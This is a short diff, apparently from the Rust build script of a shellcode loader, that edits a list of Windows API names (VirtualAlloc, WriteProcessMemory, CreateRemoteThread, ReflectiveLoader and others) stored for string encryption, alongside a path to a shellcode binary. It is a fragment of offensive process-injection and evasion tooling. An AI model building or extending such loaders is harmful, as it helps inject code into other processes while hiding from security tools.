@@ -8,9 +8,10 @@ const SHELLCODE_PATH: &'static str = "build_src/shellcode64.bin";
 const RANGE_START: usize = 0;
 const RANGE_END: usize = 0x100;
 
-static AES_STRINGS: [&str; 14] = [
+static AES_STRINGS: [&str; 16] = [
+    "VirtualAlloc",
     "VirtualAllocEx",
-    "VirtualProtectEx",
+    "VirtualProtect",
     "CreateRemoteThread",
     "WaitForSingleObject",
     "WriteProcessMemory",
@@ -21,6 +22,7 @@ static AES_STRINGS: [&str; 14] = [
     "Process32Next",
     "CloseHandle",
     "GetLastError",
+    "ReflectiveLoader",
     "MessageBoxA",
     "USER32.dll",
 ];
